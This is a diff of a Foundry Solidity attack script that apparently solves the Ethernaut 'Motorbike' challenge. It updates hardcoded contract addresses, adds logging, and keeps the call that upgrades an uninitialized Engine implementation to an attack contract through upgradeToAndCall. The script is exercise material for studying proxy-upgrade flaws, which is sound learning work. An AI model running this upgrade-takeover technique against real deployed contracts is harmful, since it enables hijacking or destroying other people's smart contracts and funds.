@@ -6,7 +6,7 @@ import "forge-std/Script.sol";
 import {Motorbike, Engine} from "../src/Motorbike.sol";
 
 contract DeployMotorbikeAttack is Script {
-    Motorbike motorbike = Motorbike(0x2976993111c3668C01b4b29f6ACD4dFa32288D70); // Proxy contract instance
+    Motorbike motorbike = Motorbike(0xBA1561903D1eb8740debe4AD3B93c7739A5a9aFB); // Proxy contract instance
 
     // vm.load(contract_address, slot_no) will return a bytes32 value and the address is 20 bytes
     // address(uint160(uint256())) is used to convert bytes32 to address
@@ -15,10 +15,12 @@ contract DeployMotorbikeAttack is Script {
     function run() external{
         vm.startBroadcast();
 
-        engineAddress.initialize();
+        //engineAddress.initialize();
+        console.log("Engine address is:", address(engineAddress));
         console.log("Attacker upgrader is:", engineAddress.upgrader());
         bytes memory encodedData = abi.encodeWithSignature("attack()");
-        engineAddress.upgradeToAndCall(0x2CfeB660f987426C38DFEFF0FED5f77F20b277D1, encodedData); // attack contract address, encoded data
+        require(encodedData.length > 0, "Encoding of attack function failed");
+        engineAddress.upgradeToAndCall(0x52d659D1f04c472678eD72F092c175D7c454bDa9, encodedData); // implementation contract points to attack contract address, encoded data
 
         vm.stopBroadcast();
     }
